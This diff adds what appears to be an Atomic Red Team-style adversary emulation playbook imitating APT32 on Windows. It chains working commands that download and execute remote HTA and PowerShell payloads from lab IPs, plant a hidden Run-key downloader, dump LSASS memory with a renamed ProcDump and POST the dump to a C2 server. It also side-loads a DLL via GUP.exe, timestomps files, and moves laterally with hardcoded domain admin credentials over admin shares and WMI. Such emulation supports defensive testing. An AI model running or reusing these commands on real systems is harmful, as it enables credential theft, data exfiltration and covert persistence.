@@ -1,0 +1,279 @@
+attack_technique: APT32-2
+display_name: APT32-2
+atomic_tests: 
+
+# Step 1
+# T1218.005
+- name: Mshta Executes Remote HTML Application (HTA)
+  description: |
+    Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    temp_file:
+      description: temp_file location for hta
+      type: string
+      default: C:\Users\Public\T1218.005.hta
+    hta_url:
+      description: URL to HTA file for execution
+      type: string
+      default: http://192.168.80.138:1234/T1218.005.hta
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      $var = Invoke-WebRequest "#{hta_url}" -UseBasicParsing
+      $var.content|out-file "#{temp_file}"
+      mshta "#{temp_file}"
+      start-sleep -s 15
+      stop-process -name "calculator" -Force
+    cleanup_command: |
+      remove-item "#{temp_file}" -ErrorAction Ignore
+    name: powershell
+# T1547
+- name: Reg Key Run
+  description: |
+    Run Key Persistence
+    Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    command_to_execute:
+      description: Thing to Run
+      type: path
+      default: C:\Path\AtomicRedTeam.exe
+  executor:
+    command: |
+      reg.exe add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v XblGameSaveTask /t REG_SZ /d "rundll32.exe javascript:\""\..\mshtml,RunHTMLApplication \"";document.write();new%20ActiveXObject(\""WScript.Shell\"").Run(\""powershell -w hidden -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.120:8081/rundll32persistence');\"")"
+      reg.exe delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v XblGameSaveTask /f 
+    name: powershell
+
+# Step 2 - Reconnaissance: Adversary surveys the victim evironment
+# T1047
+# custom
+- name: Using WMIC to collection unquoted vulnerable service 
+  description: |
+    Using WMIC to collection unquoted vulnerable service
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v "c:/windows/"
+    name: command_prompt
+
+# Step 3 - Privilege Escalation
+# T1105
+# - name: Lateral Tool Transfer
+#   description: |
+#     Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
+#   supported_platforms:
+#   - windows
+#   executor:
+#     command: |
+#       (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/Unquoted.exe','C:\Windows\Unquoted.exe')
+#     name: powershell
+#T1569
+- name: Execute a Command as a Service
+  description: |
+    Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.
+    Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`
+  supported_platforms:
+  - windows
+  input_arguments:
+    service_name:
+      description: Name of service to create
+      type: string
+      default: ARTService
+    executable_command:
+      description: Command to execute as a service
+      type: string
+      default: '%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt'
+  executor:
+    command: |
+      sc.exe create #{service_name} binPath= "#{executable_command}"
+      sc.exe start #{service_name}
+      sc.exe delete #{service_name}
+    cleanup_command: |
+      del C:\art-marker.txt >nul 2>&1
+    name: command_prompt
+- name: Discover Specific Process - tasklist
+  description: |
+    Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
+    Examples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      tasklist | findstr lsass
+    name: command_prompt
+# T1003.001
+- name: Dump LSASS.exe Memory using ProcDump
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+    ProcDump.
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/procdump.exe','C:\Windows\kb-10233.exe')
+      C:\Windows\kb-10233.exe -accepteula -ma lsass.exe C:\Users\Public\tmp\kb-10233.dmp
+    name: powershell
+    elevation_required: true
+# T1041
+- name: C2 Data Exfiltration
+  description: |
+    Exfiltrates a file present on the victim machine to the C2 server.
+  supported_platforms:
+  - windows
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: string
+      default: 192.168.80.138:9000
+    filepath:
+      description: The file which is being exfiltrated to the C2 Server.
+      type: path
+      default: C:\Users\Public\tmp\kb-10233.dmp
+  executor:
+    command: |
+      if(-not (Test-Path #{filepath})){ 
+        1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+      }
+      [System.Net.ServicePointManager]::Expect100Continue = $false
+      $filecontent = Get-Content -Path #{filepath}
+      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive -UseBasicParsing
+    name: powershell
+
+# Step 4 - Persistence: DLL Hijacking
+# T1570 + T1070.006 custom
+- name: Lateral Tool Transfer
+  description: |
+    Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/libcurl.dll','C:\Windows\System32\libcurl.dll')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/GUP.exe','C:\Users\nhi6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GUP.exe')
+    name: powershell
+- name: DLL Side-Loading using the Notepad++ GUP.exe binary
+  description: |
+    GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
+    Upon execution, calc.exe will be opened.
+  supported_platforms:
+  - windows
+  input_arguments:
+    process_name:
+      description: Name of the created process
+      type: string
+      default: calculator.exe
+    gup_executable:
+      description: GUP is an open source signed binary used by Notepad++ for software updates
+      type: path
+      default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
+  executor:
+    command: |
+      "#{gup_executable}"
+    cleanup_command: |
+      taskkill /F /IM #{process_name} >nul 2>&1
+    name: command_prompt
+- name: Windows - Modify file creation timestamp with PowerShell
+  description: |
+    Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+    To verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 2016.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).Downloadstring('http://192.168.80.138:1234/timestomp.ps1') |iex 
+      timestomp C:\Windows\System32\libcurl.dll
+    name: powershell
+
+# Step 5 - Laterial Movement
+# T1135
+- name: Network Share Discovery command prompt
+  description: |
+    Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
+    Upon execution avalaible network shares will be displayed in the powershell session
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Computer name to find a mount on.
+      type: string
+      default: localhost
+  executor:
+    command: |
+      net use X: \\192.168.80.131\C$ /user:datn.nhilnt\administrator 123456aA@
+      copy C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs X:\Users\Public\pubprn.txt
+    name: command_prompt
+# T1047
+- name: WMI Execute Remote Process
+  description: |
+    This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.
+    To clean up, provide the same node input as the one provided to run the test
+    A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" if the default or provided IP is unreachable
+  supported_platforms:
+  - windows
+  input_arguments:
+    node:
+      description: Ip Address
+      type: string
+      default: 192.168.80.131
+    user_name:
+      description: Username
+      type: string
+      default: datn.nhilnt\Administrator
+    password:
+      description: Password
+      type: string
+      default: 123456aA@
+    process_to_execute:
+      description: Name or path of process to execute.
+      type: string
+      default: notepad.exe
+  executor:
+    command: |
+      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create #{process_to_execute}
+      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process where name='#{process_to_execute}' delete >nul 2>&1
+    name: command_prompt
+# T1059.005
+- name: Visual Basic script execution to gather local computer information
+  description: |-
+    Visual Basic execution test, execute vbscript via PowerShell.
+    When successful, system information will be written to $env:TEMP\T1059.005.out.txt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    vbscript:
+      description: Path to sample script
+      type: string
+      default: PathToAtomicsFolder\T1059.005\src\sys_info.vbs
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Sample script must exist on disk at specified location (#{vbscript})
+    prereq_command: |
+      if (Test-Path "#{vbscript}") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      New-Item -ItemType Directory (Split-Path "#{vbscript}") -Force | Out-Null
+      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "#{vbscript}"
+  executor:
+    command: |
+      cscript "#{vbscript}" > $env:TEMP\T1059.005.out.txt
+    cleanup_command: |-
+      Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
+    name: powershell
+# T1570 + T1070.006 custom
+- name: Windows - Modify file creation timestamp with PowerShell
+  description: |
+    Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+    To verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 2016.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      copy C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs C:\Users\Public\pubprn.txt
+      (New-Object Net.WebClient).Downloadstring('http://192.168.80.138:1234/timestomp.ps1') |iex 
+      timestomp C:\Users\Public\pubprn.txt
+    name: powershell
